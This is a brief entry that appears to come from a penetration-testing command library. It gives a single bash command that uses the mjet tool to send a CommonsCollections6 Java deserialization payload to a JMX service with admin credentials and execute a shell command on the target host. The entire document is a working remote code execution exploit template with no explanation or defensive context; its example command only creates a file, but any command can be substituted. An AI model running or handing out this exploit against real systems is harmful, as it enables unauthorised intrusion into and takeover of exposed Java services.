---
id: 1bfa199f-fb37-4883-b019-06cadbbbe8ba
name: Deserialize CommonsCollections6 to execute command on target
type: command
executor: bash
data: jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT
  deserialize CommonsCollections6 "touch /tmp/xxx"
output: null
created_at: '2023-04-06T03:56:00.890912+00:00'
updated_at: '2023-04-06T03:56:00.909227+00:00'
---

# Deserialize CommonsCollections6 to execute command on target

```bash
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"
```
